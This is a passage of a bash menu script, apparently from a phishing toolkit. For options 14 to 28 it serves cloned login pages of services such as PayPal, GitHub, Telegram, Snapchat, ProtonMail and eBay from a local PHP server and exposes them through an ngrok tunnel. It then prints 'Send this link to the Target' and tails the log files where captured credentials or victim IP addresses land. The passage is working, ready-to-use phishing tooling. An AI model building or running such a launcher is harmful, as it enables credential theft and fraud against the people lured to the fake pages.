                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
     

                break;
                elif [ $option = 14 ] || [ $option = 14 ]
	        then
                         cd sites/
                         cd spotify/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
   

                break;
                elif [ $option = 15 ] || [ $option = 15 ]
	        then
                         cd sites/
                         cd github/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                

                break;
                elif [ $option = 16 ] || [ $option = 16 ]
	        then
                         cd sites/
                         cd ipfinder/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f ip.txt                

                break;
                elif [ $option = 17 ] || [ $option = 17 ]
	        then
               
                         cd sites/
                         cd Zomato-Phishing/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
             

                break;
                elif [ $option = 18 ] || [ $option = 18 ]
	        then

                         cd sites/
                         cd phonepay/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
                     

                break;
                elif [ $option = 19 ] || [ $option = 19 ]
	        then
                         cd sites/
                         cd paypal/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
     
                break;
                elif [ $option = 20 ] || [ $option = 20 ]
	        then
                         cd sites/
                         cd telegram/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
   

                break;
                elif [ $option = 21 ] || [ $option = 21 ]
	        then
                         cd sites/
                         cd twitter/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
     

                break;
                elif [ $option = 22 ] || [ $option = 22 ]
	        then
                         cd sites/
                         cd flipcart/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
  

                break;
                elif [ $option = 23 ] || [ $option = 23 ]
	        then
                         cd sites/
                         cd wordpress/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
    

                break;
                elif [ $option = 24 ] || [ $option = 24 ]
	        then
                         cd sites/
                         cd snapchat/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
      

                break;
                elif [ $option = 25 ] || [ $option = 25 ]
	        then
                         cd sites/
                         cd protonmail/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
 

                break;
                elif [ $option = 26 ] || [ $option = 26 ]
	        then
               
                         cd sites/
                         cd stackoverflow/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
             

                break;
                elif [ $option = 27 ] || [ $option = 27 ]
	        then

                         cd sites/
                         cd ebay/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
                         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                         clear
                         echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
                         echo ""
                         echo "" 
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         printf "\e[1;33m[\e[0m *** \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;96m ------------------------- [ *** ]\e[0m'
                         if [[ -e log.txt ]]; then
                         > log.txt
                         fi 
                         echo ""
                         echo ""
                         tail -f log.txt                
                  

                break;
                elif [ $option = 28 ] || [ $option = 28 ]
	        then
                         cd sites/
                         cd twitch/
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING PHP SERVER          \e[0m'
                         php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 3
                         echo ""
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m     STARTING NGROK SERVER          \e[0m'
                         ./ngrok http 4444 > /dev/null 2>&1 &
                         echo -e $'\e[1;33m[\e[0m\e[1;77m *** \e[0m\e[1;33m]\e[0m\e[1;32m ------------------------- [ *** ]\e[0m'
                         sleep 25
                         echo ""
